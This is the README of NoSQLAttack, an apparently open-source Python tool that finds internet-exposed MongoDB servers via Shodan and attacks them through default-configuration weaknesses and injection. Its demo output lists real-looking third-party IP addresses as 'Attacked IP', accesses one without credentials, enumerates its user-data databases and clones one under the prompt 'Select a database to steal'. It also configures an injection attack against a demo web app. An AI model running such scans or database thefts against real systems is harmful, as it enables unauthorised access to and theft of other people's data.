#[中文说明](https://github.com/youngyangyang04/NoSQLAttack/blob/master/docs/README-zh.md)
#NoSQLAttack
#Introduction
NoSQLAttack is an open source Python tool to automate expose MongoDB server IP on the internet and disclose the database data by MongoDB default configuration weaknesses and injection attacks. Presently, this project focuses on MongoDB.

It is base on [NoSQLMap](http://www.nosqlmap.net/index.html), tcstool's popular NoSQL injection tool and [shodan](https://www.shodan.io/), first search engine for Internet-connected devices. 

Some attack tests are based on and extensions of follow papers
* [Diglossia: Detecting Code Injection Attacks with Precision and Efficiency](http://www.cs.cornell.edu/~shmat/shmat_ccs13.pdf)
* [No SQL, No Injection?](https://www.research.ibm.com/haifa/Workshops/security2015/present/Aviv_NoSQL-NoInjection.pdf)
* [Several thousand MongoDBs without access control on the Internet](https://cispa.saarland/wp-content/uploads/2015/02/MongoDB_documentation.pdf).

There are two systems for testing NoSQL injection in this  project-[NoSQLInjectionAttackDemo](https://github.com/youngyangyang04/NoSQLInjectionAttackDemo).
#Background
Injection attacks, for example php array injection, js injection and mongo shell injection, endanger  mongoDB.
There are thousands of mongoDB are exposed on the internet, and hacker can download data from exposed mongoDB.

#Requirements
On a Debian or Red Hat based system, NoSQLAttack's dependencies already be writen in setup.py.
This project is built on Pycharm COMMUNITY 2016.1 with python 2.7.10. 

Varies based on features used:
* Shodan-1.5.3
* httplib2-0.9
* Python-2.7
* pymongo-2.7.2
* requests-2.5.0
* ipcalc-1.1.3
* MongoDB


#Building
On Linux, it goes something like this:
```bash
cd NoSQLAttack
python setup.py install
```
#Tips
* If after entering "python setup.py install", terminal show error information "No module named setuptools", just install setuptools. On Ubuntu, "sudo apt-get install python-setuptools", this command is useful
* Install [MongoDB](https://docs.mongodb.com/manual/administration/install-on-linux/) for MongoDB default configuration attack.

#Usage
After building, you can run NoSQLAttack like this:
```bash
NoSQLAttack
```
Upon starting NoSQLAttack you are presented with the main menu:
```bash
================================================
        _   _       _____  _____ _                      
       | \ | |     /  ___||  _  | |                     
       |  \| | ___ \ `--. | | | | |                   
       | . ` |/ _ \ `--. \| | | | |                    
       | |\  | (_) /\__/ /\ \/' / |____          
       \_| \_/\___/\____/  \_/\_\_____/                  
                                        _          
    /\      _      _                   | |  _        
   /  \   _| |_  _| |    _____    ___  | | / /       
  / /\ \ |_   _||_   _| / __  \  / __| | |/ /        
 / /--\ \  | |_   | |_  | |_| | | |__  | |\ \       
/ / -- \ \ \___\  \___\ \______\ \___| | | \_\      
================================================    
NoSQLAttack-v0.2
sunxiuyang04@gmail.com


1-Scan attacked IP
2-Configurate parameters
3-MongoDB Access Attacks
4-Injection Attacks
x-Exit
```
#demo for option-(1)
```bash
===============================================
        _   _       _____  _____ _                      
       | \ | |     /  ___||  _  | |                     
       |  \| | ___ \ `--. | | | | |                   
       | . ` |/ _ \ `--. \| | | | |                    
       | |\  | (_) /\__/ /\ \/' / |____          
       \_| \_/\___/\____/  \_/\_\_____/                  
                                        _          
    /\      _      _                   | |  _        
   /  \   _| |_  _| |_   _____    ___  | | / /       
  / /\ \ |_   _||_   _| / __  \  / __| | |/ /        
 / /--\ \  | |    | |_  | |_| |  ||__  | |\ \       
/ / -- \ \ \___\  \___\ \______\ \___| | | \_\      
===============================================    
NoSQLAttack-v0.2
sunxiuyang04@gmail.com


1-Scan attacked IP
2-Configurate parameters
3-MongoDB Access Attacks
4-Injection Attacks
x-Exit
Select an option:1
Start Scanning.....
Results found:28793
1_Attacked IP : 149.202.88.135
2_Attacked IP : 49.212.186.80
3_Attacked IP : 85.9.62.231
4_Attacked IP : 121.78.239.11
5_Attacked IP : 54.226.207.112
6_Attacked IP : 119.254.66.44
7_Attacked IP : 121.46.0.83
8_Attacked IP : 162.243.21.180
9_Attacked IP : 210.23.29.75
Select IP to attack:2
Start Default Configuration Attack(y/n)?y
DB access attacks(mongoDB)
=========================
Checking to see if crendentials are need
49.212.186.80

27017
Successful access with no credentials!


1-Get Server Version and Platform
2-Enumerate Databases/Collections/Users
3-Clone a Database
4-Return to Main Menu
Select an attack: 2
List of databases:
MultiCopyService_UserData
SmartNFC_UserData
SmartShop_UserData
KioskPointMng2_UserData
admin
db
local

1-Get Server Version and Platform
2-Enumerate Databases/Collections/Users
3-Clone a Database
4-Return to Main Menu
Select an attack: 3


(1)MultiCopyService_UserData
(2)SmartNFC_UserData
(3)SmartShop_UserData
(4)KioskPointMng2_UserData
(5)admin
(6)db
(7)dbItem
(8)local
Select a database to steal:6
Does this Database require credentials.(y/n)?n
Database cloned. Copy another (y/n)?

```
#demo for option-(2) 
For example the attacked URI is (219.223.240.36/NoSQLInjectionAttackDemo/demo_2.html), 219.223.240.36 is an IP address where the web server is deployed and this web site source code is in this project-[NoSQLInjectionAttackDemo](https://github.com/youngyangyang04/NoSQLInjectionAttackDemo).
```bash
===============================================
        _   _       _____  _____ _                      
       | \ | |     /  ___||  _  | |                     
       |  \| | ___ \ `--. | | | | |                   
       | . ` |/ _ \ `--. \| | | | |                    
       | |\  | (_) /\__/ /\ \/' / |____          
       \_| \_/\___/\____/  \_/\_\_____/                  
                                        _          
    /\      _      _                   | |  _        
   /  \   _| |_  _| |_   _____    ___  | | / /       
  / /\ \ |_   _||_   _| / __  \  / __| | |/ /        
 / /--\ \  | |    | |_  | |_| |  ||__  | |\ \       
/ / -- \ \ \___\  \___\ \______\ \___| | | \_\      
===============================================    
NoSQLAttack-v0.2
sunxiuyang04@gmail.com


1-Scan attacked IP
2-Configurate parameters
3-MongoDB Access Attacks
4-Injection Attacks
x-Exit
Select an option:2

Options
1-Set target host/IP (Current: Not Set)
2-Set web app port (Current: 80)
3-Set App Path (Current: Not Set)
4-Toggle HTTPS (Current: OFF)
5-Set Not Set Port (Current : 27017)
6-Set HTTP Request Method (GET/POST) (Current: GET)
7-Set my local Not Set/Shell IP (Current: Not Set)
8-Set shell listener port (Current: Not Set)
9-Toggle Verbose Mode: (Current: OFF)
x-Back to main menu
Set an option:1
Enter host or IP/DNS name:219.223.240.36

Target set to:219.223.240.36




Options
1-Set target host/IP (Current: 219.223.240.36)
2-Set web app port (Current: 80)
3-Set App Path (Current: Not Set)
4-Toggle HTTPS (Current: OFF)
5-Set Not Set Port (Current : 27017)
6-Set HTTP Request Method (GET/POST) (Current: GET)
7-Set my local Not Set/Shell IP (Current: Not Set)
8-Set shell listener port (Current: Not Set)
9-Toggle Verbose Mode: (Current: OFF)
x-Back to main menu
Set an option:3
Enter URL path(Press enter for no URL):/NoSQLInjectionAttackDemo/login/demo_2.php?password=2

HTTP port set to 80




Options
1-Set target host/IP (Current: 219.223.240.36)
2-Set web app port (Current: 80)
3-Set App Path (Current: /NoSQLInjectionAttackDemo/login/demo_2.php?password=2)
4-Toggle HTTPS (Current: OFF)
5-Set Not Set Port (Current : 27017)
6-Set HTTP Request Method (GET/POST) (Current: GET)
7-Set my local Not Set/Shell IP (Current: Not Set)
8-Set shell listener port (Current: Not Set)
9-Toggle Verbose Mode: (Current: OFF)
x-Back to main menu
Set an option:7
Enter host IP for my Not Set/Shells:127.0.0.1

Shell/DB listener set to 127.0.0.1




Options
1-Set target host/IP (Current: 219.223.240.36)
2-Set web app port (Current: 80)
3-Set App Path (Current: /NoSQLInjectionAttackDemo/login/demo_2.php?password=2)
4-Toggle HTTPS (Current: OFF)
5-Set Not Set Port (Current : 27017)
6-Set HTTP Request Method (GET/POST) (Current: GET)
7-Set my local Not Set/Shell IP (Current: 127.0.0.1)
8-Set shell listener port (Current: Not Set)
9-Toggle Verbose Mode: (Current: OFF)
x-Back to main menu
Set an option:x
===============================================
        _   _       _____  _____ _                      
       | \ | |     /  ___||  _  | |                     
       |  \| | ___ \ `--. | | | | |                   
       | . ` |/ _ \ `--. \| | | | |                    
       | |\  | (_) /\__/ /\ \/' / |____          
       \_| \_/\___/\____/  \_/\_\_____/                  
                                        _          
    /\      _      _                   | |  _        
   /  \   _| |_  _| |_   _____    ___  | | / /       
  / /\ \ |_   _||_   _| / __  \  / __| | |/ /        
 / /--\ \  | |    | |_  | |_| |  ||__  | |\ \       
/ / -- \ \ \___\  \___\ \______\ \___| | | \_\      
===============================================    
NoSQLAttack-v0.2
sunxiuyang04@gmail.com


1-Scan attacked IP
2-Configurate parameters
3-MongoDB Access Attacks
4-Injection Attacks
x-Exit
Select an option:4
Web App Attacks (GET)
=====================
checking to see if site at219.223.240.36:80/NoSQLInjectionAttackDemo/login/demo_2.php?password=2 is up...


```
